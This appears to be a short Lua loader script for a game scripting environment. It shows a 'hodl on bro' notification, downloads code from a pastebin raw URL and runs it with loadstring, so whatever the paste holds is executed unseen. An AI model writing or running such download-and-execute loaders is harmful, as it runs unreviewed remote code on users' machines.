local name = ...;

Program.Wait(1);
Game.ShowNotification("hodl on bro");
Program.Wait(2);
local raw = "https://pastebin.com/raw/R0CZPdQP";
local req = https.request(raw);

while not req:isDone() do
    Program.Wait(0.01);
end

loadstring(req:get())(name);
